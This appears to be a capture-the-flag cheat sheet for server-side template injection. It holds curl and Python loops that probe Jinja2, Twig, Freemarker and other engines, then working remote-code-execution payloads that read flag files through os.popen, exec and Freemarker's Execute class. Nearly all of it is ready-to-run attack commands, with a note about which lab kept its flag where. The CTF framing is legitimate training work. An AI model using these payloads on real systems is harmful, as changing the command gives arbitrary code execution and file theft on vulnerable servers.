# SSTI — input rendered back into a template

Probe all major engines at once:

```bash
for payload in '%7B%7B7*7%7D%7D' '%24%7B7*7%7D' '%3C%25%3D+7*7+%25%3E' '%23%7B7*7%7D'; do
  echo "=== $payload ==="
  curl -si "<target>/api/<endpoint>?field=$payload" $AUTH_HEADER
done
```

POST bodies (avoids shell quoting pain):

```bash
python3 -c "
import subprocess, json
target = '<target>/api/<endpoint>'
token = '<token>'
for p in ['{{7*7}}', '\${7*7}', '<%= 7*7 %>', '#{7*7}', '{{7*\"7\"}}']:
    r = subprocess.run(['curl','-si','-X','POST',target,
        '-H',f'Authorization: Bearer {token}',
        '-H','Content-Type: application/json','-d',json.dumps({'field':p})],
        capture_output=True, text=True)
    print(('[HIT] ' if ('49' in r.stdout or '7777777' in r.stdout) else '[miss] ') + p)
"
```

`49` in the response → RCE:

```bash
# Jinja2
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"field":"{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /flag.txt\").read()}}"}'

# Jinja2 across common flag paths
for f in '/flag.txt' '/flag' '/root/flag.txt' '/app/flag.txt' '/data/flag.txt'; do
  echo "=== $f ==="
  curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
    -d "{\"field\":\"{{config.__class__.__init__.__globals__['os'].popen('cat $f').read()}}\"}"
done

# Twig
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"field":"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag.txt\")}}"}'

# Freemarker
curl -si -X POST <target>/api/<endpoint> $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"field":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /flag.txt\")}"}'
```

Where the input lands matters: a field rendered into a **generated document** (invoice, PDF, export, email template) is a stronger SSTI candidate than one echoed into JSON. On GalaxyDash-011 the sink was `invoice_template`.

If `/flag.txt` and `/app/` come up empty, try `/data/` — that's where the LFI-bypass lab kept it.
